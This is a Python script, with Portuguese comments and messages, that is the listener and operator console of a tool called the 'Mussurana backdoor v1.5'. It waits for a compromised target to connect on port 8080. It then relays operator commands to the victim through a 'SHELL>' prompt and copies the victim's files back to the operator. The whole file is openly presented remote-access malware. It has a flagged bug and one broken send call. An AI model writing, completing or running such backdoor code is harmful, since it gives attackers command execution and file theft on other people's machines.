#-*-coding: utf-8-*-
import socket
import os
print("""
#############################################################
# Mussurana backdoor v1.5 by: O Renegado                     #
#############################################################
""")
h = ""
p = 8080
adr = (h, p)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
  sock.bind(adr)
  sock.listen(1)
  print("Esperando conexão com alvo...")
  cnx, ip = sock.accept()
  print("Sucesso!\nConexão estabelecida com alvo ", ip)
  while True:
    try:
      cmd = input("SHELL> ")
      if cmd == "bye":
        cnx.send(cmd.encode("utf-8"))
        print("Conexão fechada!")
        exit()
      elif cmd == "cls":
        os.system("cls")
      elif cmd == "cp":
        cnx.send(cmd.encode("utf-8"))
        ori = input("File> ")
        cnx.send(ori.encode("utf-8"))
        new = input("New> ")
        with open(new, "wb") as fl:
          # erro aqui
          fl.write(cnx.recv(1024))
          print("Arquivo copiado!")
      else:
        try:
          cnx.send(cmd.encode("utf-8"))
          msg = cnx.recv(1024).decode("utf-8")
          print(msg)
        except KeyboardInterrupt:
          cnx.send("bye").encode("utf-8")
          print("Conexão fechada por CTRL + C")
    except KeyboardInterrupt:
      msg = "bye"
      cnx.send(msg.encode("utf-8"))
      print("\nConexão fechada por CTRL + C")
      exit()
